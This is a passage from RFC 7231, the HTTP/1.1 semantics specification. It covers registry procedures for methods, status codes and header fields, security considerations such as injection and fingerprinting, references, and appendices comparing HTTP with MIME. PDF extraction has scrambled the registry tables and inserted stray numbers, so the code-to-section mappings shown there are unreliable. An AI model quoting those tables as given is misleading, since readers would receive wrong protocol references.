(Section 4.2.3), what semantics are to be associated with the payload body if any is present in the request and what refinements the method makes to header field or status code semantics. If the new method is cacheable, its definition ought to describe how, and under what conditions, a cache can store a response and use it to satisfy a subsequent request. The new method ought to describe whether it can be made conditional (Section 5.2) and, if so, how a server responds when the condition is false. Likewise, if the new method might have some use for partial response semantics ([RFC7233]), it ought to document this, too.
Note: Avoid defining a method name that starts with "M-", since that prefix might be misinterpreted as having the semantics assigned to it by [RFC2774].
Fielding & Reschke Standards Track [Page 74]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 8.1.3. Registrations
         The "Hypertext Transfer Protocol (HTTP) Method Registry" has been populated with the registrations below:
+---------+------+------------+---------------+
| Method | Safe | Idempotent | Reference | +---------+------+------------+---------------+
| CONNECT | no | no
| DELETE | no | yes
| GET | yes | yes
| HEAD | yes | yes
| OPTIONS | yes | yes | POST | no | no
| Section 4.3.6 | | Section 4.3.5 |
| Section 4.3.1 | | Section 4.3.2 |
| Section 4.3.7 | | Section 4.3.3 |
      | PUT | no | yes
| TRACE | yes | yes +---------+------+------------+---------------+
| Section 4.3.4 |
| Section 4.3.8 |
  8.2. Status Code Registry
The "Hypertext Transfer Protocol (HTTP) Status Code Registry" defines the namespace for the response status-code token (Section 6). The status code registry is maintained at <http://www.iana.org/assignments/http-status-codes>.
This section replaces the registration procedure for HTTP Status Codes previously defined in Section 7.1 of [RFC2817].
8.2.1. Procedure
A registration MUST include the following fields: o Status Code (3 digits)
o Short Description
o Pointer to specification text
       Values to be added to the HTTP status code namespace require IETF Review (see [RFC5226], Section 4.1).
  Fielding & Reschke Standards Track [Page 75]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 8.2.2. Considerations for New Status Codes
When it is necessary to express semantics for a response that are not defined by current status codes, a new status code can be registered. Status codes are generic; they are potentially applicable to any resource, not just one particular media type, kind of resource, or application of HTTP. As such, it is preferred that new status codes be registered in a document that isn't specific to a single
application.
New status codes are required to fall under one of the categories defined in Section 6. To allow existing parsers to process the response message, new status codes cannot disallow a payload, although they can mandate a zero-length payload body.
   Proposals for new status codes that are not yet widely deployed ought to avoid allocating a specific number for the code until there is
clear consensus that it will be registered; instead, early drafts can
use a notation such as "4NN", or "3N0" .. "3N9", to indicate the
class of the proposed status code(s) without consuming a number prematurely.
The definition of a new status code ought to explain the request conditions that would cause a response containing that status code (e.g., combinations of request header fields and/or method(s)) along with any dependencies on response header fields (e.g., what fields are required, what fields can modify the semantics, and what header field semantics are further refined when used with the new status code).
The definition of a new status code ought to specify whether or not it is cacheable. Note that all status codes can be cached if the response they occur in has explicit freshness information; however, status codes that are defined as being cacheable are allowed to be cached without explicit freshness information. Likewise, the definition of a status code can place constraints upon cache behavior. See [RFC7234] for more information.
Finally, the definition of a new status code ought to indicate whether the payload has any implied association with an identified resource (Section 3.1.4.1).
8.2.3. Registrations
The status code registry has been updated with the registrations below:
   Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content
+-------+-------------------------------+----------------+ | Value | Description | Reference | +-------+-------------------------------+----------------+
[Page 76]
| Section 6.3.3 |
| Non-Authoritative Information | Section 6.3.4 |
June 2014
 | 100
| 101 | 200 | 201 | 202 | 203 | 204 | 205 | 300 | 301 | 302 | 303 | 305 | 306 | 307 | 400 | 402 | 403 | 404 | 405 | 406 | 408 | 409 | 410 | 411
| Continue
| Switching Protocols | OK
| Created
| Accepted
| Section 6.2.1 |
| Section 6.2.2 |
| Section 6.3.1 |
| Section 6.3.2 |
      | No Content
| Reset Content
| Multiple Choices
| Moved Permanently | Found
| See Other
| Use Proxy
| (Unused)
| Temporary Redirect | Bad Request
| Payment Required
| Forbidden
| Not Found
| Method Not Allowed | Not Acceptable
| Request Timeout
| Conflict
| Gone
| Length Required
| Section 6.3.5 | | Section 6.3.6 |
| Section 6.4.1 |
| Section 6.4.2 |
| Section 6.4.3 |
| Section 6.4.4 | | Section 6.4.5 |
| Section 6.4.6 |
| Section 6.4.7 |
| Section 6.5.1 |
| Section 6.5.2 |
| Section 6.5.3 | | Section 6.5.4 |
| Section 6.5.5 | | Section 6.5.6 |
| Section 6.5.7 | | Section 6.5.8 |
| Section 6.5.9 |
| Section 6.5.10 |
                   | 413
| Payload Too Large | Section 6.5.11 | | URI Too Long | Section 6.5.12 |
 | 414
| 415
| 417
| 426
| 500
| 501
| 502
| 503
| 504
| 505 +-------+-------------------------------+----------------+
8.3. Header Field Registry
HTTP header fields are registered within the "Message Headers" registry located at <http://www.iana.org/assignments/message-headers>, as defined by [BCP90].
Fielding & Reschke Standards Track [Page 77]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 8.3.1. Considerations for New Header Fields
Header fields are key:value pairs that can be used to communicate data about the message, its payload, the target resource, or the connection (i.e., control data). See Section 3.2 of [RFC7230] for a general definition of header field syntax in HTTP messages.
 | Unsupported Media Type | Expectation Failed
| Upgrade Required
| Internal Server Error
| Section 6.5.13 | | Section 6.5.14 |
  | Not Implemented
| Bad Gateway
| Service Unavailable
| Gateway Timeout
| HTTP Version Not Supported | Section 6.6.6 |
| Section 6.5.15 | | Section 6.6.1 |
  | Section 6.6.2 | | Section 6.6.3 |
  | Section 6.6.4 | | Section 6.6.5 |
           The requirements for header field names are defined in [BCP90].
Authors of specifications defining new fields are advised to keep the name as short as practical and not to prefix the name with "X-"
unless the header field will never be used on the Internet. (The
"X-" prefix idiom has been extensively misused in practice; it was intended to only be used as a mechanism for avoiding name collisions inside proprietary software or intranet processing, since the prefix would ensure that private names never collide with a newly registered Internet name; see [BCP178] for further information).
New header field values typically have their syntax defined using ABNF ([RFC5234]), using the extension defined in Section 7 of [RFC7230] as necessary, and are usually constrained to the range of US-ASCII characters. Header fields needing a greater range of characters can use an encoding such as the one defined in [RFC5987].
Leading and trailing whitespace in raw field values is removed upon field parsing (Section 3.2.4 of [RFC7230]). Field definitions where leading or trailing whitespace in values is significant will have to use a container syntax such as quoted-string (Section 3.2.6 of [RFC7230]).
Because commas (",") are used as a generic delimiter between field-values, they need to be treated with care if they are allowed
in the field-value. Typically, components that might contain a comma are protected with double-quotes using the quoted-string ABNF production.
For example, a textual date and a URI (either of which might contain a comma) could be safely carried in field-values like these:
Example-URI-Field: "http://example.com/a.html,foo", "http://without-a-comma.example.com/"
         Example-Date-Field: "Sat, 04 May 1996", "Wed, 14 Sep 2005"
Note that double-quote delimiters almost always are used with the quoted-string production; using a different syntax inside double-quotes will likely cause unnecessary confusion.
Fielding & Reschke Standards Track [Page 78]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
Many header fields use a format including (case-insensitively) named parameters (for instance, Content-Type, defined in Section 3.1.1.5). Allowing both unquoted (token) and quoted (quoted-string) syntax for the parameter value enables recipients to use existing parser components. When allowing both forms, the meaning of a parameter value ought to be independent of the syntax used for it (for an example, see the notes on parameter handling for media types in Section 3.1.1.1).
Authors of specifications defining new header fields are advised to consider documenting:
o Whether the field is a single value or whether it can be a list (delimited by commas; see Section 3.2 of [RFC7230]).
If it does not use the list syntax, document how to treat messages where the field occurs multiple times (a sensible default would be to ignore the field, but this might not always be the right
choice).
     o
o o o
o
Note that intermediaries and software libraries might combine multiple header field instances into a single one, despite the field's definition not allowing the list syntax. A robust format enables recipients to discover these situations (good example: "Content-Type", as the comma can only appear inside quoted strings; bad example: "Location", as a comma can occur inside a URI).
Under what conditions the header field can be used; e.g., only in responses or requests, in all messages, only on responses to a particular request method, etc.
Whether the field should be stored by origin servers that understand it upon a PUT request.
Whether the field semantics are further refined by the context, such as by existing request methods or status codes.
Whether it is appropriate to list the field-name in the Connection header field (i.e., if the header field is to be hop-by-hop; see Section 6.1 of [RFC7230]).
Under what conditions intermediaries are allowed to insert, delete, or modify the field's value.
  Fielding & Reschke Standards Track [Page 79] RFC 7231 HTTP/1.1 Semantics and Content June 2014
o Whether it is appropriate to list the field-name in a Vary response header field (e.g., when the request header field is used by an origin server's content selection algorithm; see
Section 7.1.4).
o Whether the header field is useful or allowable in trailers (see Section 4.1 of [RFC7230]).
o Whether the header field ought to be preserved across redirects.
o Whether it introduces any additional security considerations, such as disclosure of privacy-related data.
8.3.2. Registrations
The "Message Headers" registry has been updated with the following
permanent registrations:
+-------------------+----------+----------+-----------------+
| Header Field Name | Protocol | Status | Reference | +-------------------+----------+----------+-----------------+
| Accept | http | standard | Section 5.3.2 |
      | Accept-Charset
| Accept-Encoding
| Accept-Language
| Allow | http
| Content-Encoding | http
| Content-Language | http
| Content-Location | http
| Content-Type | http
| Date | http | standard | Section 7.1.1.2 | | Expect | http | standard | Section 5.1.1 |
| |
|
| http | http
| standard | Section 5.3.3 | standard | Section 5.3.4
  | http
| standard | Section 7.4.1 |
| standard | Section 5.3.5
  | standard | Section 3.1.2.2 | | standard | Section 3.1.3.2 |
  | standard | Section 3.1.4.2 | | standard | Section 3.1.1.5 |
   | From | http | standard | Section 5.5.1 |
 | Location
| Max-Forwards | MIME-Version
| http | standard | Section 7.1.2
| http | standard | Section 5.1.2 | http | standard | Appendix A.1
|
 |
 | Referer
| Retry-After
| Server
| User-Agent
| Vary +-------------------+----------+----------+-----------------+
The change controller for the above registrations is: "IETF (iesg@ietf.org) - Internet Engineering Task Force".
Fielding & Reschke Standards Track [Page 80]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 8.4. Content Coding Registry
The "HTTP Content Coding Registry" defines the namespace for content coding names (Section 4.2 of [RFC7230]). The content coding registry
is maintained at <http://www.iana.org/assignments/http-parameters>.
8.4.1. Procedure
Content coding registrations MUST include the following fields:
| http
| http
| standard | Section 5.5.2 | | standard | Section 7.1.3
| standard | Section 7.4.2 |
|
|
   | http
| http
|
 | standard | Section 5.5.3 | http | standard | Section 7.1.4 |
         o Name
o Description
o Pointer to specification text
Names of content codings MUST NOT overlap with names of transfer codings (Section 4 of [RFC7230]), unless the encoding transformation is identical (as is the case for the compression codings defined in Section 4.2 of [RFC7230]).
Values to be added to this namespace require IETF Review (see Section 4.1 of [RFC5226]) and MUST conform to the purpose of content coding defined in this section.
8.4.2. Registrations
The "HTTP Content Coding Registry" has been updated with the
registrations below:
+----------+----------------------------------------+---------------+
| Name | Description | Reference | +----------+----------------------------------------+---------------+
| identity | Reserved (synonym for "no encoding" in | Section 5.3.4 | | | Accept-Encoding) | | +----------+----------------------------------------+---------------+
9. Security Considerations
This section is meant to inform developers, information providers,
and users of known security concerns relevant to HTTP semantics and its use for transferring information over the Internet.
Considerations related to message syntax, parsing, and routing are discussed in Section 9 of [RFC7230].
           The list of considerations below is not exhaustive. Most security concerns related to HTTP semantics are about securing server-side applications (code behind the HTTP interface), securing user agent
Fielding & Reschke Standards Track [Page 81]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
processing of payloads received via HTTP, or secure use of the Internet in general, rather than security of the protocol. Various organizations maintain topical information and links to current research on Web application security (e.g., [OWASP]).
9.1. Attacks Based on File and Path Names
Origin servers frequently make use of their local file system to manage the mapping from effective request URI to resource representations. Most file systems are not designed to protect against malicious file or path names. Therefore, an origin server needs to avoid accessing names that have a special significance to the system when mapping the request target to files, folders, or directories.
For example, UNIX, Microsoft Windows, and other operating systems use ".." as a path component to indicate a directory level above the
current one, and they use specially named paths or file names to send data to system devices. Similar naming conventions might exist
within other types of storage systems. Likewise, local storage systems have an annoying tendency to prefer user-friendliness over security when handling invalid or unexpected characters, recomposition of decomposed characters, and case-normalization of
 case-insensitive names.
Attacks based on such special names tend to focus on either denial- of-service (e.g., telling the server to read from a COM port) or disclosure of configuration and source files that are not meant to be served.
9.2. Attacks Based on Command, Code, or Query Injection
Origin servers often use parameters within the URI as a means of identifying system services, selecting database entries, or choosing
a data source. However, data received in a request cannot be
trusted. An attacker could construct any of the request data
elements (method, request-target, header fields, or body) to contain data that might be misinterpreted as a command, code, or query when passed through a command invocation, language interpreter, or database interface.
For example, SQL injection is a common attack wherein additional query language is inserted within some part of the request-target or header fields (e.g., Host, Referer, etc.). If the received data is
used directly within a SELECT statement, the query language might be interpreted as a database command instead of a simple string value. This type of implementation vulnerability is extremely common, in spite of being easy to prevent.
Fielding & Reschke Standards Track [Page 82]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
In general, resource implementations ought to avoid use of request
 data in contexts that are processed or interpreted as instructions. Parameters ought to be compared to fixed strings and acted upon as a result of that comparison, rather than passed through an interface
that is not prepared for untrusted data. Received data that isn't
based on fixed parameters ought to be carefully filtered or encoded to avoid being misinterpreted.
Similar considerations apply to request data when it is stored and later processed, such as within log files, monitoring tools, or when included within a data format that allows embedded scripts.
9.3. Disclosure of Personal Information
Clients are often privy to large amounts of personal information, including both information provided by the user to interact with resources (e.g., the user's name, location, mail address, passwords, encryption keys, etc.) and information about the user's browsing activity over time (e.g., history, bookmarks, etc.). Implementations need to prevent unintentional disclosure of personal information.
9.4. Disclosure of Sensitive Information in URIs
URIs are intended to be shared, not secured, even when they identify secure resources. URIs are often shown on displays, added to templates when a page is printed, and stored in a variety of unprotected bookmark lists. It is therefore unwise to include information within a URI that is sensitive, personally identifiable,
or a risk to disclose.
Authors of services ought to avoid GET-based forms for the submission of sensitive data because that data will be placed in the
request-target. Many existing servers, proxies, and user agents log
or display the request-target in places where it might be visible to
third parties. Such services ought to use POST-based form submission instead. Since the Referer header field tells a target site about the context that resulted in a request, it has the potential to reveal
information about the user's immediate browsing history and any personal information that might be found in the referring resource's URI. Limitations on the Referer header field are described in Section 5.5.2 to address some of its security considerations.
 Fielding & Reschke Standards Track [Page 83]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 9.5. Disclosure of Fragment after Redirects
Although fragment identifiers used within URI references are not sent in requests, implementers ought to be aware that they will be visible to the user agent and any extensions or scripts running as a result
of the response. In particular, when a redirect occurs and the original request's fragment identifier is inherited by the new reference in Location (Section 7.1.2), this might have the effect of disclosing one site's fragment to another site. If the first site
uses personal information in fragments, it ought to ensure that redirects to other sites include a (possibly empty) fragment component in order to block that inheritance.
9.6. Disclosure of Product Information 1,557

The User-Agent (Section 5.5.3), Via (Section 5.7.1 of [RFC7230]), and Server (Section 7.4.2) header fields often reveal information about the respective sender's software systems. In theory, this can make it easier for an attacker to exploit known security holes; in
practice, attackers tend to try all potential holes regardless of the apparent software versions being used.
Proxies that serve as a portal through a network firewall ought to take special precautions regarding the transfer of header information that might identify hosts behind the firewall. The Via header field allows intermediaries to replace sensitive machine names with pseudonyms.
9.7. Browser Fingerprinting
Browser fingerprinting is a set of techniques for identifying a
specific user agent over time through its unique set of
characteristics. These characteristics might include information related to its TCP behavior, feature capabilities, and scripting environment, though of particular interest here is the set of unique characteristics that might be communicated via HTTP. Fingerprinting is considered a privacy concern because it enables tracking of a user agent's behavior over time without the corresponding controls that
the user might have over other forms of data collection (e.g.,
cookies). Many general-purpose user agents (i.e., Web browsers) have taken steps to reduce their fingerprints.
There are a number of request header fields that might reveal information to servers that is sufficiently unique to enable fingerprinting. The From header field is the most obvious, though it is expected that From will only be sent when self-identification is desired by the user. Likewise, Cookie header fields are deliberately
   Fielding & Reschke Standards Track [Page 84]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
designed to enable re-identification, so fingerprinting concerns only apply to situations where cookies are disabled or restricted by the user agent's configuration.
The User-Agent header field might contain enough information to uniquely identify a specific device, usually when combined with other characteristics, particularly if the user agent sends excessive
details about the user's system or extensions. However, the source of unique information that is least expected by users is proactive negotiation (Section 5.3), including the Accept, Accept-Charset, Accept-Encoding, and Accept-Language header fields.
In addition to the fingerprinting concern, detailed use of the Accept-Language header field can reveal information the user might consider to be of a private nature. For example, understanding a given language set might be strongly correlated to membership in a particular ethnic group. An approach that limits such loss of
privacy would be for a user agent to omit the sending of Accept-Language except for sites that have been whitelisted, perhaps via interaction after detecting a Vary header field that indicates language negotiation might be useful.
In environments where proxies are used to enhance privacy, user agents ought to be conservative in sending proactive negotiation header fields. General-purpose user agents that provide a high degree of header field configurability ought to inform users about the loss of privacy that might result if too much detail is provided.
 As an extreme privacy measure, proxies could filter the proactive negotiation header fields in relayed requests.
10. Acknowledgments
See Section 10 of [RFC7230].
11. References
11.1. Normative References
[RFC2045] Freed, N. and N. Borenstein, "Multipurpose Internet Mail Extensions (MIME) Part One: Format of Internet Message Bodies", RFC 2045, November 1996.
[RFC2046] Freed, N. and N. Borenstein, "Multipurpose Internet Mail Extensions (MIME) Part Two: Media Types", RFC 2046, November 1996.
[RFC2119] Bradner, S., "Key words for use in RFCs to Indicate Requirement Levels", BCP 14, RFC 2119, March 1997.
Fielding & Reschke Standards Track [Page 85]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
[RFC3986] Berners-Lee, T., Fielding, R., and L. Masinter, "Uniform Resource Identifier (URI): Generic Syntax", STD 66,
RFC 3986, January 2005.
[RFC4647] Phillips, A., Ed. and M. Davis, Ed., "Matching of Language
         Tags", BCP 47, RFC 4647, September 2006.
[RFC5234] Crocker, D., Ed. and P. Overell, "Augmented BNF for Syntax
Specifications: ABNF", STD 68, RFC 5234, January 2008. [RFC5646] Phillips, A., Ed. and M. Davis, Ed., "Tags for Identifying
Languages", BCP 47, RFC 5646, September 2009.
[RFC6365] Hoffman, P. and J. Klensin, "Terminology Used in Internationalization in the IETF", BCP 166, RFC 6365, September 2011.
[RFC7230] Fielding, R., Ed. and J. Reschke, Ed., "Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing",
RFC 7230, June 2014.
[RFC7232] Fielding, R., Ed. and J. Reschke, Ed., "Hypertext Transfer Protocol (HTTP/1.1): Conditional Requests", RFC 7232,
June 2014.
[RFC7233] Fielding, R., Ed., Lafon, Y., Ed., and J. Reschke, Ed., "Hypertext Transfer Protocol (HTTP/1.1): Range Requests", RFC 7233, June 2014.
[RFC7234] Fielding, R., Ed., Nottingham, M., Ed., and J. Reschke, Ed., "Hypertext Transfer Protocol (HTTP/1.1): Caching", RFC 7234, June 2014.
[RFC7235] Fielding, R., Ed. and J. Reschke, Ed., "Hypertext Transfer Protocol (HTTP/1.1): Authentication", RFC 7235, June 2014.
11.2. Informative References
[BCP13] Freed, N., Klensin, J., and T. Hansen, "Media Type
Specifications and Registration Procedures", BCP 13, 1,561

RFC 6838, January 2013.
[BCP178] Saint-Andre, P., Crocker, D., and M. Nottingham, "Deprecating the "X-" Prefix and Similar Constructs in Application Protocols", BCP 178, RFC 6648, June 2012.
Fielding & Reschke Standards Track [Page 86]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
[BCP90] Klyne, G., Nottingham, M., and J. Mogul, "Registration Procedures for Message Header Fields", BCP 90, RFC 3864, September 2004.
[OWASP] van der Stock, A., Ed., "A Guide to Building Secure Web Applications and Web Services", The Open Web Application Security Project (OWASP) 2.0.1, July 2005, <https://www.owasp.org/>.
        [REST]
Fielding, R., "Architectural Styles and the Design of Network-based Software Architectures",
Doctoral Dissertation, University of California, Irvine, September 2000, <http://roy.gbiv.com/pubs/dissertation/top.htm>.
    [RFC1945] Berners-Lee, T., Fielding, R., and H. Nielsen, "Hypertext Transfer Protocol -- HTTP/1.0", RFC 1945, May 1996.
 [RFC2049] Freed, N. and N. Borenstein, "Multipurpose Internet Mail Extensions (MIME) Part Five: Conformance Criteria and Examples", RFC 2049, November 1996.
[RFC2068] Fielding, R., Gettys, J., Mogul, J., Nielsen, H., and T. Berners-Lee, "Hypertext Transfer Protocol -- HTTP/1.1", RFC 2068, January 1997.
[RFC2295] Holtman, K. and A. Mutz, "Transparent Content Negotiation in HTTP", RFC 2295, March 1998.
[RFC2388] Masinter, L., "Returning Values from Forms: multipart/ form-data", RFC 2388, August 1998.
[RFC2557] Palme, F., Hopmann, A., Shelness, N., and E. Stefferud, "MIME Encapsulation of Aggregate Documents, such as HTML (MHTML)", RFC 2557, March 1999.
[RFC2616] Fielding, R., Gettys, J., Mogul, J., Frystyk, H., Masinter, L., Leach, P., and T. Berners-Lee, "Hypertext Transfer Protocol -- HTTP/1.1", RFC 2616, June 1999.
[RFC2774] Frystyk, H., Leach, P., and S. Lawrence, "An HTTP Extension Framework", RFC 2774, February 2000.
[RFC2817] Khare, R. and S. Lawrence, "Upgrading to TLS Within HTTP/1.1", RFC 2817, May 2000.
[RFC2978] Freed, N. and J. Postel, "IANA Charset Registration Procedures", BCP 19, RFC 2978, October 2000.
Fielding & Reschke Standards Track [Page 87]
         RFC 7231 HTTP/1.1 Semantics and Content June 2014
[RFC5226] Narten, T. and H. Alvestrand, "Guidelines for Writing an IANA Considerations Section in RFCs", BCP 26, RFC 5226, May 2008.
[RFC5246] Dierks, T. and E. Rescorla, "The Transport Layer Security (TLS) Protocol Version 1.2", RFC 5246, August 2008.
[RFC5322] Resnick, P., "Internet Message Format", RFC 5322, October 2008.
[RFC5789] Dusseault, L. and J. Snell, "PATCH Method for HTTP", RFC 5789, March 2010.
[RFC5905] Mills, D., Martin, J., Ed., Burbank, J., and W. Kasch, "Network Time Protocol Version 4: Protocol and Algorithms Specification", RFC 5905, June 2010.
[RFC5987] Reschke, J., "Character Set and Language Encoding for Hypertext Transfer Protocol (HTTP) Header Field Parameters", RFC 5987, August 2010.
[RFC5988] Nottingham, M., "Web Linking", RFC 5988, October 2010. [RFC6265] Barth, A., "HTTP State Management Mechanism", RFC 6265,
April 2011.
[RFC6266] Reschke, J., "Use of the Content-Disposition Header Field in the Hypertext Transfer Protocol (HTTP)", RFC 6266,
June 2011.
[RFC7238] Reschke, J., "The Hypertext Transfer Protocol (HTTP)
           Status Code 308 (Permanent Redirect)", RFC 7238, June 2014.
 Fielding & Reschke Standards Track [Page 88]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 Appendix A. Differences between HTTP and MIME
HTTP/1.1 uses many of the constructs defined for the Internet Message Format [RFC5322] and the Multipurpose Internet Mail Extensions (MIME) [RFC2045] to allow a message body to be transmitted in an open
variety of representations and with extensible header fields.
However, RFC 2045 is focused only on email; applications of HTTP have many characteristics that differ from email; hence, HTTP has features that differ from MIME. These differences were carefully chosen to
     optimize performance over binary connections, to allow greater freedom in the use of new media types, to make date comparisons easier, and to acknowledge the practice of some early HTTP servers and clients.
This appendix describes specific areas where HTTP differs from MIME. Proxies and gateways to and from strict MIME environments need to be aware of these differences and provide the appropriate conversions where necessary.
A.1. MIME-Version
HTTP is not a MIME-compliant protocol. However, messages can include a single MIME-Version header field to indicate what version of the
MIME protocol was used to construct the message. Use of the MIME-Version header field indicates that the message is in full conformance with the MIME protocol (as defined in [RFC2045]).
Senders are responsible for ensuring full conformance (where
possible) when exporting HTTP messages to strict MIME environments.
A.2. Conversion to Canonical Form
MIME requires that an Internet mail body part be converted to canonical form prior to being transferred, as described in Section 4
of [RFC2049]. Section 3.1.1.3 of this document describes the forms allowed for subtypes of the "text" media type when transmitted over HTTP. [RFC2046] requires that content with a type of "text"
represent line breaks as CRLF and forbids the use of CR or LF outside of line break sequences. HTTP allows CRLF, bare CR, and bare LF to indicate a line break within text content.
A proxy or gateway from HTTP to a strict MIME environment ought to translate all line breaks within the text media types described in Section 3.1.1.3 of this document to the RFC 2049 canonical form of CRLF. Note, however, this might be complicated by the presence of a
         Content-Encoding and by the fact that HTTP allows the use of some charsets that do not use octets 13 and 10 to represent CR and LF, respectively.
Fielding & Reschke Standards Track [Page 89]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
Conversion will break any cryptographic checksums applied to the original content unless the original content is already in canonical form. Therefore, the canonical form is recommended for any content that uses such checksums in HTTP.
A.3. Conversion of Date Formats
HTTP/1.1 uses a restricted set of date formats (Section 7.1.1.1) to simplify the process of date comparison. Proxies and gateways from other protocols ought to ensure that any Date header field present in a message conforms to one of the HTTP/1.1 formats and rewrite the date if necessary.
A.4. Conversion of Content-Encoding
MIME does not include any concept equivalent to HTTP/1.1's Content-Encoding header field. Since this acts as a modifier on the media type, proxies and gateways from HTTP to MIME-compliant protocols ought to either change the value of the Content-Type header field or decode the representation before forwarding the message. (Some experimental applications of Content-Type for Internet mail
have used a media-type parameter of ";conversions=<content-coding>"
   to perform a function equivalent to Content-Encoding. However, this parameter is not part of the MIME standards).
A.5. Conversion of Content-Transfer-Encoding
HTTP does not use the Content-Transfer-Encoding field of MIME. Proxies and gateways from MIME-compliant protocols to HTTP need to remove any Content-Transfer-Encoding prior to delivering the response message to an HTTP client.
Proxies and gateways from HTTP to MIME-compliant protocols are responsible for ensuring that the message is in the correct format
and encoding for safe transport on that protocol, where "safe transport" is defined by the limitations of the protocol being used. Such a proxy or gateway ought to transform and label the data with an appropriate Content-Transfer-Encoding if doing so will improve the likelihood of safe transport over the destination protocol.
A.6. MHTML and Line Length Limitations
HTTP implementations that share code with MHTML [RFC2557] implementations need to be aware of MIME line length limitations. Since HTTP does not have this limitation, HTTP does not fold long lines. MHTML messages being transported by HTTP follow all conventions of MHTML, including line length limitations and folding, canonicalization, etc., since HTTP transfers message-bodies as
Fielding & Reschke Standards Track [Page 90]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
   payload and, aside from the "multipart/byteranges" type (Appendix A of [RFC7233]), does not interpret the content or any MIME header lines that might be contained therein.
Appendix B. Changes from RFC 2616
The primary changes in this revision have been editorial in nature: extracting the messaging syntax and partitioning HTTP semantics into separate documents for the core features, conditional requests, partial requests, caching, and authentication. The conformance language has been revised to clearly target requirements and the terminology has been improved to distinguish payload from representations and representations from resources.
A new requirement has been added that semantics embedded in a URI be disabled when those semantics are inconsistent with the request
method, since this is a common cause of interoperability failure.
(Section 2)
An algorithm has been added for determining if a payload is associated with a specific identifier. (Section 3.1.4.1)
The default charset of ISO-8859-1 for text media types has been removed; the default is now whatever the media type definition says. Likewise, special treatment of ISO-8859-1 has been removed from the Accept-Charset header field. (Section 3.1.1.3 and Section 5.3.3)
The definition of Content-Location has been changed to no longer affect the base URI for resolving relative URI references, due to
poor implementation support and the undesirable effect of potentially breaking relative links in content-negotiated resources.
(Section 3.1.4.2)
To be consistent with the method-neutral parsing algorithm of
[RFC7230], the definition of GET has been relaxed so that requests 1,569

can have a body, even though a body has no meaning for GET. (Section 4.3.1)
Servers are no longer required to handle all Content-* header fields and use of Content-Range has been explicitly banned in PUT requests. (Section 4.3.4)
Definition of the CONNECT method has been moved from [RFC2817] to this specification. (Section 4.3.6)
The OPTIONS and TRACE request methods have been defined as being safe. (Section 4.3.7 and Section 4.3.8)
Fielding & Reschke Standards Track [Page 91]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
The Expect header field's extension mechanism has been removed due to
widely-deployed broken implementations. (Section 5.1.1)
The Max-Forwards header field has been restricted to the OPTIONS and TRACE methods; previously, extension methods could have used it as well. (Section 5.1.2)
The "about:blank" URI has been suggested as a value for the Referer header field when no referring URI is applicable, which distinguishes that case from others where the Referer field is not sent or has been removed. (Section 5.5.2)
The following status codes are now cacheable (that is, they can be
         stored and reused by a cache without explicit freshness information present): 204, 404, 405, 414, 501. (Section 6)
The 201 (Created) status description has been changed to allow for the possibility that more than one resource has been created. (Section 6.3.2)
The definition of 203 (Non-Authoritative Information) has been broadened to include cases of payload transformations as well. (Section 6.3.4)
The set of request methods that are safe to automatically redirect is
no longer closed; user agents are able to make that determination based upon the request method semantics. The redirect status codes 301, 302, and 307 no longer have normative requirements on response payloads and user interaction. (Section 6.4)
The status codes 301 and 302 have been changed to allow user agents to rewrite the method from POST to GET. (Sections 6.4.2 and 6.4.3)
The description of the 303 (See Other) status code has been changed to allow it to be cached if explicit freshness information is given,
and a specific definition has been added for a 303 response to GET. (Section 6.4.4)
The 305 (Use Proxy) status code has been deprecated due to security concerns regarding in-band configuration of a proxy. (Section 6.4.5)
The 400 (Bad Request) status code has been relaxed so that it isn't limited to syntax errors. (Section 6.5.1)
The 426 (Upgrade Required) status code has been incorporated from [RFC2817]. (Section 6.5.15)
           Fielding & Reschke Standards Track [Page 92]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
The target of requirements on HTTP-date and the Date header field have been reduced to those systems generating the date, rather than all systems sending a date. (Section 7.1.1)
The syntax of the Location header field has been changed to allow all URI references, including relative references and fragments, along with some clarifications as to when use of fragments would not be appropriate. (Section 7.1.2)
Allow has been reclassified as a response header field, removing the option to specify it in a PUT request. Requirements relating to the content of Allow have been relaxed; correspondingly, clients are not required to always trust its value. (Section 7.4.1)
A Method Registry has been defined. (Section 8.1)
The Status Code Registry has been redefined by this specification; previously, it was defined in Section 7.1 of [RFC2817].
(Section 8.2)
Registration of content codings has been changed to require IETF Review. (Section 8.4)
The Content-Disposition header field has been removed since it is now defined by [RFC6266].
         The Content-MD5 header field has been removed because it was inconsistently implemented with respect to partial responses.
Appendix C. Imported ABNF
The following core rules are included by reference, as defined in
Appendix B.1 of [RFC5234]: ALPHA (letters), CR (carriage return), CRLF (CR LF), CTL (controls), DIGIT (decimal 0-9), DQUOTE (double quote), HEXDIG (hexadecimal 0-9/A-F/a-f), HTAB (horizontal tab), LF (line feed), OCTET (any 8-bit sequence of data), SP (space), and VCHAR (any visible US-ASCII character).
The rules below are defined in [RFC7230]:
BWS = <BWS, see [RFC7230], Section 3.2.3>
OWS = <OWS, see [RFC7230], Section 3.2.3>
RWS = <RWS, see [RFC7230], Section 3.2.3> URI-reference = <URI-reference, see [RFC7230], Section 2.7> absolute-URI = <absolute-URI, see [RFC7230], Section 2.7>
              comment field-name partial-URI
= <comment, see [RFC7230], Section 3.2.6> = <comment, see [RFC7230], Section 3.2>
= <partial-URI, see [RFC7230], Section 2.7>
      Fielding & Reschke Standards Track [Page 93]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 quoted-string = <quoted-string, see [RFC7230], Section 3.2.6>
token = <token, see [RFC7230], Section 3.2.6> Appendix D. Collected ABNF
     In the collected ABNF below, list rules are expanded as per Section 1.2 of [RFC7230].
